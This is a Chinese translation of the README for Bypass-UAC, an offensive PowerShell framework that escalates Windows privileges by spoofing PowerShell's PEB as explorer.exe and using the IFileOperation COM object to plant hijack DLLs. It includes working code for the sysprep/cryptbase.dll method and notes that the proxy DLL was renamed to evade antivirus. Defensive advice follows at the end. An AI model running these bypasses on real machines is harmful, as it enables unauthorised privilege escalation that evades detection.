> 原文链接: https://www.anquanke.com//post/id/84582 


# Bypass-UAC-帮你绕过Windows的用户账户控制


                                阅读量   
                                **169456**
                            
                        |
                        
                                                                                    



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/README.md](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/README.md)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01cd9cc629a5ea55e9.png)](https://p1.ssl.qhimg.com/t01cd9cc629a5ea55e9.png)

**UAC（User Account Control）概述**

UAC（用户帐户控制）是微软公司为了提高Windows系统安全性而在Windows Vista中引入的一种新新型安全技术，它要求用户在执行某些可能会影响计算机运行的操作或更改其他用户设置的操作之前，向系统申请权限或提供管理员‌密码。通过在这些操作启动前对其进行验证，UAC 可以帮助防止恶意软件和间谍软件在未经许可的情况下在计算机上进行安装或对计算机进行更改。

**<br>**

**UAC存在的意义**

这项安全机制可以防止企业环境中由于员工的某些错误的操作而引起的安全问题。如果员工能够轻易获取管理员权限的话，他们往往会在无意中修改设备的配置，并且安装某些禁止安装的软件。但如果不给员工提供本地管理员权限的话，他们又无法正常工作了。如果某位员工的计算机感染了恶意软件，而他的用户账号又拥有完整的管理员权限的话，那么问题就难办了。

[![](https://p0.ssl.qhimg.com/t0127f13962b6608c15.png)](https://p0.ssl.qhimg.com/t0127f13962b6608c15.png)

用户账户控制（UAC）可以允许我们以普通用户权限来进行某些操作。这样一来，当你在安装服务、驱动程序、或者写入某些系统文件时出现了问题的话，也不至于会直接影响系统的运行。此时，用户需要与Windows的桌面环境进行交互，例如右键点击程序，然后选择“以管理员身份运行”，此时系统会弹出UAC对话框以供用户进行选择。

UAC可以调整用户账户的权限等级，这也就意味着即便是我们当前的账号拥有本地管理员权限，我们仍然能够以普通用户的身份来执行某些程序。当程序要求以管理员身份运行时，系统会弹出一个UAC对话框来告知用户。此时如果用户选择“同意”的话，那么就需要输入本地管理员密码来进行下一步操作。但是具体的情况还是要看用户是如何进行设置的。

**<br>**

**Bypass-UAC简介－［**[**Github主页传送门**](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)**］**

****

[![](https://p5.ssl.qhimg.com/t010aaf8b0f5b7baa46.png)](https://p5.ssl.qhimg.com/t010aaf8b0f5b7baa46.png)

Bypass-UAC提供了一个能够进行UAC绕过的框架，该框架可以通过调用IFileOperation COM对象所提供的方法来实现自动提权。这其实并不是一种新的技术了，在此之前，我们可以通过向“explorer.exe”进程注入DLL来实现UAC绕过。但是这种方式并不是最有效的，因为向explorer注入DLL很有可能会触发系统的安全警报。不仅如此，利用这种固定的、无法控制的DLL来实现UAC绕过，将会极大地降低操作的灵活性。

如果想解决这个问题，那么Bypass-UAC就是一个很好的选择了。Bypass-UAC可以重写PowerShell的PEB结构，这种方法所实现的效果与之前的方法效果相同，因为COM对象完全依赖于Windows的进程状态API（PSAPI），而该API可以读取进程的PEB信息。

[![](https://p2.ssl.qhimg.com/t01b00cbaa6fa8f242f.png)](https://p2.ssl.qhimg.com/t01b00cbaa6fa8f242f.png)

**使用**

Bypass-UAC是一个独立的框架，它不需要依赖其他任何的环境。但是请注意，使用该框架时唯一的要求就是目标主机必须安装有PowerShell v2。

**方法**：

1.UacMethodSysprep：Leo Davidson设计出的一种技术(sysprep -&gt; cryptbase.dll)

目标系统: x32/x64 Windows 7 &amp; 8

2.ucmDismMethod: 一种混合方法 (PkgMgr -&gt; DISM -&gt; dismcore.dll)

目标系统: x64 Win7+ (该漏洞目前已修复)

3.UacMethodMMC2: 一种混合方法(mmc -&gt; rsop.msc -&gt; wbemcomn.dll)

目标系统: x64 Win7+ (该漏洞目前已修复)

4.UacMethodTcmsetup: 一种混合方法(tcmsetup -&gt; tcmsetup.exe.local -&gt; comctl32.dll)

目标系统: x32/x64 Win7+ (该漏洞目前已修复)

**<br>**

**输出样例**

Windows 7专业版

[![](https://p0.ssl.qhimg.com/t01b9ff6c4c572815f6.png)](https://p0.ssl.qhimg.com/t01b9ff6c4c572815f6.png)

Windows 8 企业版

[![](https://p1.ssl.qhimg.com/t01a715c267fa120a80.png)](https://p1.ssl.qhimg.com/t01a715c267fa120a80.png)

**<br>**

**组件**

**PSReflect**

该组件由Matt Graeber（[@mattifestation](https://twitter.com/mattifestation)）负责开发，它可以帮助你在内存中轻松定义枚举类型、结构体、以及Win32函数。这个组件是非常关键的，正是因为它的存在，所以PowerShell可以无需在运行时编译C#代码，并直接调用Windows提供的API接口。需要注意的是，这种操作模式在大多数情况下都没问题，但是如果“csc”文件被屏蔽的话，此时就无法向本地磁盘中写入临时文件了。

**Masquerade-PEB（伪造的PEB）**

这是修改版的[Masquerade-PEB](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1)，它可以使用PSReflect组件。这个函数可以重写PowerShell的PEB结构，从而实现伪装“explorer.exe”的目的。

Invoke-IFileOperation

该组件可以在内存中加载一个.NET dll，进而将IFileOperation COM对象的访问接口暴露给PowerShell。该组件所实现的功能参考了Stephen Toub在2007年12月份的MSDN杂志中所发表的内容，本项目Github仓库的[image文件夹](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/images)中提供有相关信息。除此之外，用户也可以访问[FileOperation文件夹](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/FileOperations)来获取有关该组件的详细信息。

```
PS C:Usersb33f&gt; $IFileOperation |Get-Member
 
    TypeName: FileOperation.FileOperation
 
 Name              MemberType Definition
 ----              ---------- ----------
 CopyItem          Method     void CopyItem(string source, string destination, string newName)
 DeleteItem        Method     void DeleteItem(string source)
 Dispose           Method     void Dispose(), void IDisposable.Dispose()
 Equals            Method     bool Equals(System.Object obj)
 GetHashCode       Method     int GetHashCode()
 GetType           Method     type GetType()
 MoveItem          Method     void MoveItem(string source, string destination, string newName)
 NewItem           Method     void NewItem(string folderName, string name, System.IO.FileAttributes attrs)
 PerformOperations Method     void PerformOperations()
 RenameItem        Method     void RenameItem(string source, string newName)
 ToString          Method     string ToString()
 
Emit-Yamabiko
```

该组件可以向磁盘中写入一个x32或x64位的代理DLL，这个DLL是基于UACME项目（[@hfiref0x](https://twitter.com/hfiref0x)）中的[fubuki](https://github.com/hfiref0x/UACME/tree/master/Source/Fubuki)来实现的。简而言之，我去掉了其中的一些冗余功能，并且对部分代码文件和变量进行了重命名以躲避反病毒产品的检测。如果用户感兴趣的话，可以访问[Yamabiko文件夹](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Yamabiko)获取关于该组件的详细信息。

**<br>**

**贡献代码**

目前，Bypass-UAC框架中主要提供了四种绕过方法。之后我会逐步添加新的UAC绕过方法，但是如果有能力的用户可以给我提供帮助的话，那就再好不过了。实际上，添加新方法的步骤是十分简单的，下面给出了一段演示代码，仅供各位参考。当然了，各位也可以直接使用[EXPORTSTOC++](http://sourcesecure.net/tools/exportstoc/)工具，这样会方便很多。



```
'UacMethodSysprep'
`{`
    # Original Leo Davidson sysprep method
    # Works on everything pre 8.1
    if ($OSMajorMinor -ge 6.3) `{`
        echo "[!] Your OS does not support this method!`n"
        Return
    `}`
 
    # Impersonate explorer.exe
    echo "`n[!] Impersonating explorer.exe!"
    Masquerade-PEB -BinPath "C:Windowsexplorer.exe"
 
    if ($DllPath) `{`
        echo "[&gt;] Using custom proxy dll.."
        echo "[+] Dll path: $DllPath"
    `}` else `{`
        # Write Yamabiko.dll to disk
        echo "[&gt;] Dropping proxy dll.."
        Emit-Yamabiko
    `}`
 
    # Expose IFileOperation COM object
    Invoke-IFileOperation
 
    # Exploit logic
    echo "[&gt;] Performing elevated IFileOperation::MoveItem operation.."
    $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + 'System32sysprep'), "cryptbase.dll")
    $IFileOperation.PerformOperations()
    echo "`n[?] Executing sysprep.."
    IEX $($env:SystemRoot + 'System32sysprepsysprep.exe')
 
    # Clean-up
    echo "[!] UAC artifact: $($env:SystemRoot + 'System32sysprepcryptbase.dll')`n"
`}`
```



**免责声明**

该项目仅允许授权用户使用，请不要将其用于恶意目的。如果用户使用该项目来进行非法操作的话，本人一概不负责。

保护自己的安全

**不要向普通用户提供本地管理员权限；**

**修改UAC的默认设置，将其修改为“始终通知并等待我的响应”。除此之外，在授权某项操作时，还应该要求用户输入密码。**

**别忘了微软公司的官方声明：UAC并不是一个安全保护功能。**

**<br>**

**参考资料**

－UACME：

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

－Windows 7 UAC 白名单：

[http://www.pretentiousname.com/misc/win7_uac_whitelist2.html](http://www.pretentiousname.com/misc/win7_uac_whitelist2.html)

－恶意应用兼容性分析：

[https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf](https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf)

－UACMe线程的内核模式分析：

[http://www.kernelmode.info/forum/viewtopic.php?f=11&amp;t=3643](http://www.kernelmode.info/forum/viewtopic.php?f=11&amp;t=3643)

－Syscan360，UAC安全问题：

[https://www.syscan360.org/slides/2013_ZH_DeepThinkingTheUACSecurityIssues_Instruder.pdf](https://www.syscan360.org/slides/2013_ZH_DeepThinkingTheUACSecurityIssues_Instruder.pdf)

－微软技术支持，Windows 7的用户账户控制机制：

[https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx](https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx)

－Cobalt Strike，用户账户控制－渗透测试人员必备知识：

[http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/](http://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/)

 


